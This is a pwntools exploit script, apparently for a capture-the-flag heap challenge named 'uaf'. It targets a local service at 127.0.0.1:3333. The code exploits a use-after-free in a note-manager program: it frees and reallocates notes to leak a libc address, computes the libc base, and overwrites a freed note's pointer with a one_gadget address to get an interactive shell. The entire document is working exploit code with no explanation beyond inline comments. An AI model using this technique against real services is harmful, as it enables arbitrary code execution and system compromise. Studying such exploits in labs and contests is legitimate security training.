#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = "debug"
#r = process('./uaf')
r = remote("127.0.0.1", 3333)

def addnote(size, content):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.send(content)


def delnote(idx):
    r.recvuntil(":")
    r.sendline("2")
    r.recvuntil(":")
    r.sendline(str(idx))


def printnote(idx):
    r.recvuntil(":")
    r.sendline("3")
    r.recvuntil(":")
    r.sendline(str(idx))

def debug():
    log.info("pid: "+str(r.pid))
    pause()
#gdb.attach(r)

addnote(0x100, "aaaa\n") # idx: 0
addnote(0x100, "ddaa\n") # idx: 1
addnote(0x60, "ddaa\n") # idx: 2

delnote(0) # fastbin[0] -> note0 -> 0
delnote(1) # fastbin[0] -> note1 -> note0 -> 0
delnote(2) # fastbin[0] -> note2 -> note1 -> note0 -> 0

# unsortbin <--> note1.content <--> note0.content

# leak libc
addnote(0x100, "\x78") # idx: 3
                       # use note2, and note0.content
                       # we only edit 1 byte in fd of note0.content
                       # so when puts the note0.content, we will get unsort bin addr
printnote(3)


libc_addr = u64(r.recvn(6).ljust(8, "\x00"))
libc_base = libc_addr - 0x3c4b78
log.success("libc: "+hex(libc_base))
magic = libc_base + 0xf1147 # 0x45216 0x4526a 0xf02a4 0xf1147

addnote(0x10, p64(magic)) # idx: 4
                          # use note1, and note0

printnote(0)

r.interactive()
